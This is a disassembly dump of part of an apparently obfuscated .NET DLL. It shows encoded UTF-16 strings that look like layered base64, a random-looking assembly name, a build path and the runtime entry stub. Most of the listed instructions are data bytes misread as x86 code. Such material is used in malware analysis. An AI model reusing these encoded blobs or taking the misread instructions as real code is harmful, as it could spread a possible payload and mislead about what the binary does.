10004ca5:	00 45 00             	add    %al,0x0(%ebp)
10004ca8:	6c                   	insb   (%dx),%es:(%edi)
10004ca9:	00 4e 00             	add    %cl,0x0(%esi)
10004cac:	53                   	push   %ebx
10004cad:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004cb1:	00 43 00             	add    %al,0x0(%ebx)
10004cb4:	54                   	push   %esp
10004cb5:	00 57 00             	add    %dl,0x0(%edi)
10004cb8:	68 00 6c 00 55       	push   $0x55006c00
10004cbd:	00 31                	add    %dh,(%ecx)
10004cbf:	00 4a 00             	add    %cl,0x0(%edx)
10004cc2:	6f                   	outsl  %ds:(%esi),(%dx)
10004cc3:	00 57 00             	add    %dl,0x0(%edi)
10004cc6:	48                   	dec    %eax
10004cc7:	00 52 00             	add    %dl,0x0(%edx)
10004cca:	4a                   	dec    %edx
10004ccb:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004ccf:	00 6b 00             	add    %ch,0x0(%ebx)
10004cd2:	32 00                	xor    (%eax),%al
10004cd4:	51                   	push   %ecx
10004cd5:	00 6b 00             	add    %ch,0x0(%ebx)
10004cd8:	31 00                	xor    %eax,(%eax)
10004cda:	6f                   	outsl  %ds:(%esi),(%dx)
10004cdb:	00 5a 00             	add    %bl,0x0(%edx)
10004cde:	56                   	push   %esi
10004cdf:	00 4e 00             	add    %cl,0x0(%esi)
10004ce2:	30 00                	xor    %al,(%eax)
10004ce4:	53                   	push   %ebx
10004ce5:	00 55 00             	add    %dl,0x0(%ebp)
10004ce8:	31 00                	xor    %eax,(%eax)
10004cea:	4a                   	dec    %edx
10004ceb:	00 4e 00             	add    %cl,0x0(%esi)
10004cee:	6b 00 4a             	imul   $0x4a,(%eax),%eax
10004cf1:	00 4e 00             	add    %cl,0x0(%esi)
10004cf4:	61                   	popa
10004cf5:	00 47 00             	add    %al,0x0(%edi)
10004cf8:	56                   	push   %esi
10004cf9:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
10004cfd:	00 6e 00             	add    %ch,0x0(%esi)
10004d00:	63 00                	arpl   %eax,(%eax)
10004d02:	39 00                	cmp    %eax,(%eax)
10004d04:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
10004d08:	6c                   	insb   (%dx),%es:(%edi)
10004d09:	00 4e 00             	add    %cl,0x0(%esi)
10004d0c:	53                   	push   %ebx
10004d0d:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004d11:	00 43 00             	add    %al,0x0(%ebx)
10004d14:	54                   	push   %esp
10004d15:	00 57 00             	add    %dl,0x0(%edi)
10004d18:	68 00 6c 00 55       	push   $0x55006c00
10004d1d:	00 77 00             	add    %dh,0x0(%edi)
10004d20:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004d25:	15 74 00 49 00       	adc    $0x490074,%eax
10004d2a:	4d                   	dec    %ebp
10004d2b:	00 49 00             	add    %cl,0x0(%ecx)
10004d2e:	36 00 42 00          	add    %al,%ss:0x0(%edx)
10004d32:	4d                   	dec    %ebp
10004d33:	00 68 00             	add    %ch,0x0(%eax)
10004d36:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
10004d3a:	00 03                	add    %al,(%ebx)
10004d3c:	ba 00 01 80 b9       	mov    $0xb9800100,%edx
10004d41:	57                   	push   %edi
10004d42:	00 56 00             	add    %dl,0x0(%esi)
10004d45:	49                   	dec    %ecx
10004d46:	00 7a 00             	add    %bh,0x0(%edx)
10004d49:	56                   	push   %esi
10004d4a:	00 6a 00             	add    %ch,0x0(%edx)
10004d4d:	68 00 69 00 61       	push   $0x61006900
10004d52:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
10004d56:	00 4a 00             	add    %cl,0x0(%edx)
10004d59:	56                   	push   %esi
10004d5a:	00 45 00             	add    %al,0x0(%ebp)
10004d5d:	78 00                	js     0x10004d5f
10004d5f:	74 00                	je     0x10004d61
10004d61:	56                   	push   %esi
10004d62:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10004d66:	00 53 00             	add    %dl,0x0(%ebx)
10004d69:	4d                   	dec    %ebp
10004d6a:	00 31                	add    %dh,(%ecx)
10004d6c:	00 59 00             	add    %bl,0x0(%ecx)
10004d6f:	34 00                	xor    $0x0,%al
10004d71:	59                   	pop    %ecx
10004d72:	00 6d 00             	add    %ch,0x0(%ebp)
10004d75:	6b 00 35             	imul   $0x35,(%eax),%eax
10004d78:	00 53 00             	add    %dl,0x0(%ebx)
10004d7b:	56                   	push   %esi
10004d7c:	00 52 00             	add    %dl,0x0(%edx)
10004d7f:	5a                   	pop    %edx
10004d80:	00 55 00             	add    %dl,0x0(%ebp)
10004d83:	6a 00                	push   $0x0
10004d85:	4e                   	dec    %esi
10004d86:	00 57 00             	add    %dl,0x0(%edi)
10004d89:	4f                   	dec    %edi
10004d8a:	00 47 00             	add    %al,0x0(%edi)
10004d8d:	4a                   	dec    %edx
10004d8e:	00 70 00             	add    %dh,0x0(%eax)
10004d91:	4f                   	dec    %edi
10004d92:	00 55 00             	add    %dl,0x0(%ebp)
10004d95:	6c                   	insb   (%dx),%es:(%edi)
10004d96:	00 55 00             	add    %dl,0x0(%ebp)
10004d99:	4e                   	dec    %esi
10004d9a:	00 46 00             	add    %al,0x0(%esi)
10004d9d:	70 00                	jo     0x10004d9f
10004d9f:	52                   	push   %edx
10004da0:	00 57 00             	add    %dl,0x0(%edi)
10004da3:	56                   	push   %esi
10004da4:	00 49 00             	add    %cl,0x0(%ecx)
10004da7:	7a 00                	jp     0x10004da9
10004da9:	56                   	push   %esi
10004daa:	00 6a 00             	add    %ch,0x0(%edx)
10004dad:	68 00 69 00 61       	push   $0x61006900
10004db2:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
10004db6:	00 4a 00             	add    %cl,0x0(%edx)
10004db9:	56                   	push   %esi
10004dba:	00 46 00             	add    %al,0x0(%esi)
10004dbd:	6c                   	insb   (%dx),%es:(%edi)
10004dbe:	00 53 00             	add    %dl,0x0(%ebx)
10004dc1:	4d                   	dec    %ebp
10004dc2:	00 31                	add    %dh,(%ecx)
10004dc4:	00 59 00             	add    %bl,0x0(%ecx)
10004dc7:	34 00                	xor    $0x0,%al
10004dc9:	59                   	pop    %ecx
10004dca:	00 6d 00             	add    %ch,0x0(%ebp)
10004dcd:	6b 00 35             	imul   $0x35,(%eax),%eax
10004dd0:	00 53 00             	add    %dl,0x0(%ebx)
10004dd3:	56                   	push   %esi
10004dd4:	00 51 00             	add    %dl,0x0(%ecx)
10004dd7:	39 00                	cmp    %eax,(%eax)
10004dd9:	50                   	push   %eax
10004dda:	00 56 00             	add    %dl,0x0(%esi)
10004ddd:	6c                   	insb   (%dx),%es:(%edi)
10004dde:	00 53 00             	add    %dl,0x0(%ebx)
10004de1:	4d                   	dec    %ebp
10004de2:	00 31                	add    %dh,(%ecx)
10004de4:	00 59 00             	add    %bl,0x0(%ecx)
10004de7:	34 00                	xor    $0x0,%al
10004de9:	59                   	pop    %ecx
10004dea:	00 6d 00             	add    %ch,0x0(%ebp)
10004ded:	6b 00 35             	imul   $0x35,(%eax),%eax
10004df0:	00 53 00             	add    %dl,0x0(%ebx)
10004df3:	56                   	push   %esi
10004df4:	00 51 00             	add    %dl,0x0(%ecx)
10004df7:	3d 00 00 15 59       	cmp    $0x59150000,%eax
10004dfc:	00 52 00             	add    %dl,0x0(%edx)
10004dff:	33 00                	xor    (%eax),%eax
10004e01:	56                   	push   %esi
10004e02:	00 38                	add    %bh,(%eax)
10004e04:	00 62 00             	add    %ah,0x0(%edx)
10004e07:	69 00 39 00 49 00    	imul   $0x490039,(%eax),%eax
10004e0d:	54                   	push   %esp
10004e0e:	00 00                	add    %al,(%eax)
10004e10:	71 ac                	jno    0x10004dbe
10004e12:	3e 58                	ds pop %eax
10004e14:	10 3c 18             	adc    %bh,(%eax,%ebx,1)
10004e17:	43                   	inc    %ebx
10004e18:	9a cb 1c a9 0d 9f f3 	lcall  $0xf39f,$0xda91ccb
10004e1f:	3b 00                	cmp    (%eax),%eax
10004e21:	04 20                	add    $0x20,%al
10004e23:	01 01                	add    %eax,(%ecx)
10004e25:	08 03                	or     %al,(%ebx)
10004e27:	20 00                	and    %al,(%eax)
10004e29:	01 05 20 01 01 11    	add    %eax,0x11010120
10004e2f:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004e32:	01 01                	add    %eax,(%ecx)
10004e34:	0e                   	push   %cs
10004e35:	04 20                	add    $0x20,%al
10004e37:	01 01                	add    %eax,(%ecx)
10004e39:	02 0c 07             	add    (%edi,%eax,1),%cl
10004e3c:	07                   	pop    %es
10004e3d:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
10004e40:	10 18                	adc    %bl,(%eax)
10004e42:	18 18                	sbb    %bl,(%eax)
10004e44:	12 49 09             	adc    0x9(%ecx),%cl
10004e47:	06                   	push   %es
10004e48:	10 01                	adc    %al,(%ecx)
10004e4a:	01 08                	add    %ecx,(%eax)
10004e4c:	1e                   	push   %ds
10004e4d:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004e50:	01 11                	add    %edx,(%ecx)
10004e52:	0c 02                	or     $0x2,%al
10004e54:	06                   	push   %es
10004e55:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004e5b:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004e5e:	01 01                	add    %eax,(%ecx)
10004e60:	08 05 00 01 12 49    	or     %al,0x49120100
10004e66:	08 03                	or     %al,(%ebx)
10004e68:	20 00                	and    %al,(%eax)
10004e6a:	02 04 00             	add    (%eax,%eax,1),%al
10004e6d:	00 12                	add    %dl,(%edx)
10004e6f:	6d                   	insl   (%dx),%es:(%edi)
10004e70:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004e75:	0e                   	push   %cs
10004e76:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004e7b:	05 05 20 02 0e       	add    $0xe022005,%eax
10004e80:	0e                   	push   %cs
10004e81:	0e                   	push   %cs
10004e82:	0c 10                	or     $0x10,%al
10004e84:	01 02                	add    %eax,(%edx)
10004e86:	15 12 7d 01 1e       	adc    $0x1e017d12,%eax
10004e8b:	00 1e                	add    %bl,(%esi)
10004e8d:	00 08                	add    %cl,(%eax)
10004e8f:	03 0a                	add    (%edx),%ecx
10004e91:	01 0e                	add    %ecx,(%esi)
10004e93:	06                   	push   %es
10004e94:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004e99:	03 05 20 02 01 1c    	add    0x1c010220,%eax
10004e9f:	18 17                	sbb    %dl,(%edi)
10004ea1:	10 02                	adc    %al,(%edx)
10004ea3:	02 15 12 7d 01 1e    	add    0x1e017d12,%dl
10004ea9:	01 15 12 7d 01 1e    	add    %edx,0x1e017d12
10004eaf:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004eb5:	00 1e                	add    %bl,(%esi)
10004eb7:	01 04 0a             	add    %eax,(%edx,%ecx,1)
10004eba:	02 0e                	add    (%esi),%cl
10004ebc:	03 0c 10             	add    (%eax,%edx,1),%ecx
10004ebf:	01 01                	add    %eax,(%ecx)
10004ec1:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
10004ec6:	7d 01                	jge    0x10004ec9
10004ec8:	1e                   	push   %ds
10004ec9:	00 03                	add    %al,(%ebx)
10004ecb:	0a 01                	or     (%ecx),%al
10004ecd:	03 05 20 01 01 1d    	add    0x1d010120,%eax
10004ed3:	03 06                	add    (%esi),%eax
10004ed5:	07                   	pop    %es
10004ed6:	02 12                	add    (%edx),%dl
10004ed8:	18 1d 0e 05 15 12    	sbb    %bl,0x1215050e
10004ede:	5d                   	pop    %ebp
10004edf:	01 0e                	add    %ecx,(%esi)
10004ee1:	05 20 01 01 13       	add    $0x13010120,%eax
10004ee6:	00 09                	add    %cl,(%ecx)
10004ee8:	00 03                	add    %al,(%ebx)
10004eea:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004eef:	80 85 06 15 12 59 02 	addb   $0x2,0x59121506(%ebp)
10004ef6:	0e                   	push   %cs
10004ef7:	02 16                	add    (%esi),%dl
10004ef9:	10 01                	adc    %al,(%ecx)
10004efb:	02 15 12 7d 01 1e    	add    0x1e017d12,%dl
10004f01:	00 15 12 7d 01 1e    	add    %dl,0x1e017d12
10004f07:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004f0d:	00 02                	add    %al,(%edx)
10004f0f:	04 20                	add    $0x20,%al
10004f11:	01 08                	add    %ecx,(%eax)
10004f13:	08 04 07             	or     %al,(%edi,%eax,1)
10004f16:	02 0e                	add    (%esi),%cl
10004f18:	0e                   	push   %cs
10004f19:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
10004f1e:	0e                   	push   %cs
10004f1f:	06                   	push   %es
10004f20:	00 01                	add    %al,(%ecx)
10004f22:	12 80 8d 0e 06 00    	adc    0x60e8d(%eax),%al
10004f28:	03 0e                	add    (%esi),%ecx
10004f2a:	0e                   	push   %cs
10004f2b:	0e                   	push   %cs
10004f2c:	0e                   	push   %cs
10004f2d:	06                   	push   %es
10004f2e:	00 03                	add    %al,(%ebx)
10004f30:	01 0e                	add    %ecx,(%esi)
10004f32:	0e                   	push   %cs
10004f33:	02 03                	add    (%ebx),%al
10004f35:	20 00                	and    %al,(%eax)
10004f37:	08 04 20             	or     %al,(%eax,%eiz,1)
10004f3a:	01 03                	add    %eax,(%ebx)
10004f3c:	08 04 00             	or     %al,(%eax,%eax,1)
10004f3f:	01 0e                	add    %ecx,(%esi)
10004f41:	0e                   	push   %cs
10004f42:	05 20 01 02 13       	add    $0x13020120,%eax
10004f47:	00 08                	add    %cl,(%eax)
10004f49:	b7 7a                	mov    $0x7a,%bh
10004f4b:	5c                   	pop    %esp
10004f4c:	56                   	push   %esi
10004f4d:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004f50:	89 03                	mov    %eax,(%ebx)
10004f52:	06                   	push   %es
10004f53:	12 45 02             	adc    0x2(%ebp),%al
10004f56:	06                   	push   %es
10004f57:	09 02                	or     %eax,(%edx)
10004f59:	06                   	push   %es
10004f5a:	0e                   	push   %cs
10004f5b:	02 06                	add    (%esi),%al
10004f5d:	08 02                	or     %al,(%edx)
10004f5f:	06                   	push   %es
10004f60:	06                   	push   %es
10004f61:	03 06                	add    (%esi),%eax
10004f63:	12 14 07             	adc    (%edi,%eax,1),%dl
10004f66:	06                   	push   %es
10004f67:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004f6c:	03 06                	add    (%esi),%eax
10004f6e:	06                   	push   %es
10004f6f:	15 12 5d 01 0e       	adc    $0xe015d12,%eax
10004f74:	06                   	push   %es
10004f75:	00 02                	add    %al,(%edx)
10004f77:	02 18                	add    (%eax),%bl
10004f79:	10 09                	adc    %cl,(%ecx)
10004f7b:	0b 00                	or     (%eax),%eax
10004f7d:	07                   	pop    %es
10004f7e:	18 18                	sbb    %bl,(%eax)
10004f80:	18 09                	sbb    %cl,(%ecx)
10004f82:	18 18                	sbb    %bl,(%eax)
10004f84:	09 10                	or     %edx,(%eax)
10004f86:	18 11                	sbb    %dl,(%ecx)
10004f88:	00 0a                	add    %cl,(%edx)
10004f8a:	02 0e                	add    (%esi),%cl
10004f8c:	0e                   	push   %cs
10004f8d:	18 18                	sbb    %bl,(%eax)
10004f8f:	02 09                	add    (%ecx),%cl
10004f91:	18 0e                	sbb    %cl,(%esi)
10004f93:	10 11                	adc    %dl,(%ecx)
10004f95:	0c 10                	or     $0x10,%al
10004f97:	11 10                	adc    %edx,(%eax)
10004f99:	0a 00                	or     (%eax),%al
10004f9b:	05 02 18 18 1d       	add    $0x1d181802,%eax
10004fa0:	05 09 10 18 06       	add    $0x6181009,%eax
10004fa5:	00 02                	add    %al,(%edx)
10004fa7:	01 0e                	add    %ecx,(%esi)
10004fa9:	1d 05 08 00 05       	sbb    $0x5000805,%eax
10004fae:	18 18                	sbb    %bl,(%eax)
10004fb0:	18 09                	sbb    %cl,(%ecx)
10004fb2:	09 09                	or     %ecx,(%ecx)
10004fb4:	04 00                	add    $0x0,%al
10004fb6:	01 02                	add    %eax,(%edx)
10004fb8:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004fbb:	01 0e                	add    %ecx,(%esi)
10004fbd:	08 03                	or     %al,(%ebx)
10004fbf:	00 00                	add    %al,(%eax)
10004fc1:	01 03                	add    %eax,(%ebx)
10004fc3:	00 00                	add    %al,(%eax)
10004fc5:	0e                   	push   %cs
10004fc6:	04 20                	add    $0x20,%al
10004fc8:	01 03                	add    %eax,(%ebx)
10004fca:	0e                   	push   %cs
10004fcb:	04 20                	add    $0x20,%al
10004fcd:	01 02                	add    %eax,(%edx)
10004fcf:	0e                   	push   %cs
10004fd0:	08 01                	or     %al,(%ecx)
10004fd2:	00 08                	add    %cl,(%eax)
10004fd4:	00 00                	add    %al,(%eax)
10004fd6:	00 00                	add    %al,(%eax)
10004fd8:	00 1e                	add    %bl,(%esi)
10004fda:	01 00                	add    %eax,(%eax)
10004fdc:	01 00                	add    %eax,(%eax)
10004fde:	54                   	push   %esp
10004fdf:	02 16                	add    (%esi),%dl
10004fe1:	57                   	push   %edi
10004fe2:	72 61                	jb     0x10005045
10004fe4:	70 4e                	jo     0x10005034
10004fe6:	6f                   	outsl  %ds:(%esi),(%dx)
10004fe7:	6e                   	outsb  %ds:(%esi),(%dx)
10004fe8:	45                   	inc    %ebp
10004fe9:	78 63                	js     0x1000504e
10004feb:	65 70 74             	gs jo  0x10005062
10004fee:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004ff5:	77 73                	ja     0x1000506a
10004ff7:	01 08                	add    %ecx,(%eax)
10004ff9:	01 00                	add    %eax,(%eax)
10004ffb:	02 00                	add    (%eax),%al
10004ffd:	00 00                	add    %al,(%eax)
10004fff:	00 00                	add    %al,(%eax)
10005001:	13 01                	adc    (%ecx),%eax
10005003:	00 0e                	add    %cl,(%esi)
10005005:	57                   	push   %edi
10005006:	6c                   	insb   (%dx),%es:(%edi)
10005007:	5a                   	pop    %edx
10005008:	52                   	push   %edx
10005009:	58                   	pop    %eax
1000500a:	65 65 79 76          	gs gs jns 0x10005084
1000500e:	56                   	push   %esi
1000500f:	65 76 44             	gs jbe 0x10005056
10005012:	54                   	push   %esp
10005013:	00 00                	add    %al,(%eax)
10005015:	05 01 00 00 00       	add    $0x1,%eax
1000501a:	00 17                	add    %dl,(%edi)
1000501c:	01 00                	add    %eax,(%eax)
1000501e:	12 43 6f             	adc    0x6f(%ebx),%al
10005021:	70 79                	jo     0x1000509c
10005023:	72 69                	jb     0x1000508e
10005025:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
1000502b:	20 20                	and    %ah,(%eax)
1000502d:	32 30                	xor    (%eax),%dh
1000502f:	32 34 00             	xor    (%eax,%eax,1),%dh
10005032:	00 29                	add    %ch,(%ecx)
10005034:	01 00                	add    %eax,(%eax)
10005036:	24 46                	and    $0x46,%al
10005038:	41                   	inc    %ecx
10005039:	44                   	inc    %esp
1000503a:	31 39                	xor    %edi,(%ecx)
1000503c:	34 30                	xor    $0x30,%al
1000503e:	34 2d                	xor    $0x2d,%al
10005040:	33 34 36             	xor    (%esi,%esi,1),%esi
10005043:	30 2d 34 39 42 36    	xor    %ch,0x36423934
10005049:	2d 38 46 33 45       	sub    $0x45334638,%eax
1000504e:	2d 39 45 34 45       	sub    $0x45344539,%eax
10005053:	37                   	aaa
10005054:	36 41                	ss inc %ecx
10005056:	35 35 39 36 30       	xor    $0x30363935,%eax
1000505b:	00 00                	add    %al,(%eax)
1000505d:	0c 01                	or     $0x1,%al
1000505f:	00 07                	add    %al,(%edi)
10005061:	31 2e                	xor    %ebp,(%esi)
10005063:	30 2e                	xor    %ch,(%esi)
10005065:	30 2e                	xor    %ch,(%esi)
10005067:	30 00                	xor    %al,(%eax)
10005069:	00 49 01             	add    %cl,0x1(%ecx)
1000506c:	00 1a                	add    %bl,(%edx)
1000506e:	2e 4e                	cs dec %esi
10005070:	45                   	inc    %ebp
10005071:	54                   	push   %esp
10005072:	46                   	inc    %esi
10005073:	72 61                	jb     0x100050d6
10005075:	6d                   	insl   (%dx),%es:(%edi)
10005076:	65 77 6f             	gs ja  0x100050e8
10005079:	72 6b                	jb     0x100050e6
1000507b:	2c 56                	sub    $0x56,%al
1000507d:	65 72 73             	gs jb  0x100050f3
10005080:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
10005087:	38 01                	cmp    %al,(%ecx)
10005089:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
1000508d:	46                   	inc    %esi
1000508e:	72 61                	jb     0x100050f1
10005090:	6d                   	insl   (%dx),%es:(%edi)
10005091:	65 77 6f             	gs ja  0x10005103
10005094:	72 6b                	jb     0x10005101
10005096:	44                   	inc    %esp
10005097:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
1000509e:	61                   	popa
1000509f:	6d                   	insl   (%dx),%es:(%edi)
100050a0:	65 12 2e             	adc    %gs:(%esi),%ch
100050a3:	4e                   	dec    %esi
100050a4:	45                   	inc    %ebp
100050a5:	54                   	push   %esp
100050a6:	20 46 72             	and    %al,0x72(%esi)
100050a9:	61                   	popa
100050aa:	6d                   	insl   (%dx),%es:(%edi)
100050ab:	65 77 6f             	gs ja  0x1000511d
100050ae:	72 6b                	jb     0x1000511b
100050b0:	20 34 2e             	and    %dh,(%esi,%ebp,1)
100050b3:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
100050be:	00 00                	add    %al,(%eax)
100050c0:	e0 66                	loopne 0x10005128
100050c2:	dd d1                	fst    %st(1)
100050c4:	00 00                	add    %al,(%eax)
100050c6:	00 00                	add    %al,(%eax)
100050c8:	02 00                	add    (%eax),%al
100050ca:	00 00                	add    %al,(%eax)
100050cc:	79 00                	jns    0x100050ce
100050ce:	00 00                	add    %al,(%eax)
100050d0:	f4                   	hlt
100050d1:	50                   	push   %eax
100050d2:	00 00                	add    %al,(%eax)
100050d4:	f4                   	hlt
100050d5:	32 00                	xor    (%eax),%al
	...
100050e3:	00 10                	add    %dl,(%eax)
	...
100050f1:	00 00                	add    %al,(%eax)
100050f3:	00 52 53             	add    %dl,0x53(%edx)
100050f6:	44                   	inc    %esp
100050f7:	53                   	push   %ebx
100050f8:	ab                   	stos   %eax,%es:(%edi)
100050f9:	9f                   	lahf
100050fa:	e5 67                	in     $0x67,%eax
100050fc:	c6                   	(bad)
100050fd:	1f                   	pop    %ds
100050fe:	ff 44 bc 9d          	incl   -0x63(%esp,%edi,4)
10005102:	94                   	xchg   %eax,%esp
10005103:	e2 b8                	loop   0x100050bd
10005105:	da e8                	(bad)
10005107:	ac                   	lods   %ds:(%esi),%al
10005108:	01 00                	add    %eax,(%eax)
1000510a:	00 00                	add    %al,(%eax)
1000510c:	43                   	inc    %ebx
1000510d:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
10005111:	65 72 73             	gs jb  0x10005187
10005114:	5c                   	pop    %esp
10005115:	77 6f                	ja     0x10005186
10005117:	72 6b                	jb     0x10005184
10005119:	74 65                	je     0x10005180
1000511b:	61                   	popa
1000511c:	6d                   	insl   (%dx),%es:(%edi)
1000511d:	5c                   	pop    %esp
1000511e:	44                   	inc    %esp
1000511f:	65 73 6b             	gs jae 0x1000518d
10005122:	74 6f                	je     0x10005193
10005124:	70 5c                	jo     0x10005182
10005126:	57                   	push   %edi
10005127:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
1000512b:	72 76                	jb     0x100051a3
1000512d:	69 63 65 5c 61 73 73 	imul   $0x7373615c,0x65(%ebx),%esp
10005134:	65 74 73             	gs je  0x100051aa
10005137:	5c                   	pop    %esp
10005138:	62 69 6e             	bound  %ebp,0x6e(%ecx)
1000513b:	5c                   	pop    %esp
1000513c:	74 65                	je     0x100051a3
1000513e:	6d                   	insl   (%dx),%es:(%edi)
1000513f:	70 2d                	jo     0x1000516e
10005141:	64 37                	fs aaa
10005143:	61                   	popa
10005144:	65 65 65 38 31       	gs gs cmp %dh,%gs:(%ecx)
10005149:	34 33                	xor    $0x33,%al
1000514b:	32 63 5c             	xor    0x5c(%ebx),%ah
1000514e:	6f                   	outsl  %ds:(%esi),(%dx)
1000514f:	62 6a 5c             	bound  %ebp,0x5c(%edx)
10005152:	52                   	push   %edx
10005153:	65 6c                	gs insb (%dx),%es:(%edi)
10005155:	65 61                	gs popa
10005157:	73 65                	jae    0x100051be
10005159:	5c                   	pop    %esp
1000515a:	57                   	push   %edi
1000515b:	6c                   	insb   (%dx),%es:(%edi)
1000515c:	5a                   	pop    %edx
1000515d:	52                   	push   %edx
1000515e:	58                   	pop    %eax
1000515f:	65 65 79 76          	gs gs jns 0x100051d9
10005163:	56                   	push   %esi
10005164:	65 76 44             	gs jbe 0x100051ab
10005167:	54                   	push   %esp
10005168:	2e 70 64             	jo,pn  0x100051cf
1000516b:	62 00                	bound  %eax,(%eax)
1000516d:	95                   	xchg   %eax,%ebp
1000516e:	51                   	push   %ecx
	...
10005177:	00 00                	add    %al,(%eax)
10005179:	af                   	scas   %es:(%edi),%eax
1000517a:	51                   	push   %ecx
1000517b:	00 00                	add    %al,(%eax)
1000517d:	00 20                	add    %ah,(%eax)
	...
10005193:	00 00                	add    %al,(%eax)
10005195:	a1 51 00 00 00       	mov    0x51,%eax
	...
100051a2:	00 5f 43             	add    %bl,0x43(%edi)
100051a5:	6f                   	outsl  %ds:(%esi),(%dx)
100051a6:	72 44                	jb     0x100051ec
100051a8:	6c                   	insb   (%dx),%es:(%edi)
100051a9:	6c                   	insb   (%dx),%es:(%edi)
100051aa:	4d                   	dec    %ebp
100051ab:	61                   	popa
100051ac:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
100051b3:	72 65                	jb     0x1000521a
100051b5:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
100051b9:	6c                   	insb   (%dx),%es:(%edi)
	...
100051c2:	ff 25 00 20 00 10    	jmp    *0x10002000
